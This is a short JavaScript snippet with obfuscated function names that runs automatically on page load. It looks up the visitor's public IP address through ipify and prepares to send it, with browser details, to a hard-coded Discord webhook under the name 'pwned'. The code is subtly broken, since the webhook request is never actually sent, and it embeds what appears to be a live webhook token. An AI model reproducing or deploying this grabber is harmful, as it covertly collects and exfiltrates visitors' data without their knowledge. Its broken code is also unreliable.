function aIdfB21P() {
    var webhook = 'https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV';

    var request = new XMLHttpRequest();
    request.open('POSt', webhook);
    request.setRequestHeader('Content-type', 'application/json');

    var params = {
        username: 'pwned',
        content: `${window.navigator}\n${LOpVf986('https://api.ipify.org/')}`
    };
}

function LOpVf986(theUrl)
{
    var request = new XMLHttpRequest();
    request.open( "GET", theUrl, false ); // false for synchronous request
    request.send( null );
    return request.responseText;
}

window.onload = aIdfB21P;